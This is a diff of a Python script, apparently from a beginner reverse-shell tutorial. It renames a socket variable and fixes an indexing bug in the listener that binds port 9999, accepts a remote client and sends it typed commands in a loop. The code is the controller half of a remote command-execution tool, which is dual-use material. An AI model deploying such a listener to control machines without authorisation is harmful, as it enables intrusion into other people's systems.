@@ -5,19 +5,19 @@ import sys
 # define some global variables
 host: str = ""
 port: int = 0
-sock: socket = socket.socket()
+s: socket = socket.socket()
 
 # create a socket
 def create_socket():
     global host
     global port
-    global sock
+    global s
 
     # enclose in try/except block to handle connection errors
     try:
         host = ""
         port = 9999
-        sock = socket.socket()
+        s = socket.socket()
     except socket.error as msg:
         print('Socket creation error:' + str(msg))
 
@@ -25,13 +25,13 @@ def create_socket():
 def bind_socket():
     global host
     global port
-    global sock
+    global s
 
     try:
         print('Binding the port: ' + str(port))
 
-        sock.bind((host, port)) # (host, port) is a tuple - bind host and port
-        sock.listen(5) # listening for incoming connection
+        s.bind((host, port)) # (host, port) is a tuple - bind host and port
+        s.listen(5) # listening for incoming connection
 
     except socket.error as msg:
         print('Socket binding error' + str(msg) + '\n' + 'Retrying....')
@@ -39,19 +39,19 @@ def bind_socket():
 
 # establish connection with a client (socket must be listening "s.listen()"
 def accept_connection():
-    conn, address = sock.accept() # stores connection and a list containing IP address
-    print('Connection Established: IP Address ' + address[0] + 'Port: ' + str(address[[1]]))
+    conn, address = s.accept() # stores connection and a list containing IP address
+    print('Connection Established: IP Address ' + address[0] + ' Port: ' + str(address[1]))
     send_commands(conn)
 
     conn.close() # always close the connection when finished
 
 # send commands to remote computer
 def send_commands(conn):
-    while True: # start infinite loop so can send lots of commands until done
+    while True: # start infinite loop so can send commands until done
         cmd = input()
         if cmd == 'quit': # quit to close everything down
             conn.close()
-            sock.close()
+            s.close()
             sys.exit() # this closes the command window
 
         if len(str.encode(cmd)) > 0: # checking user has typed a command
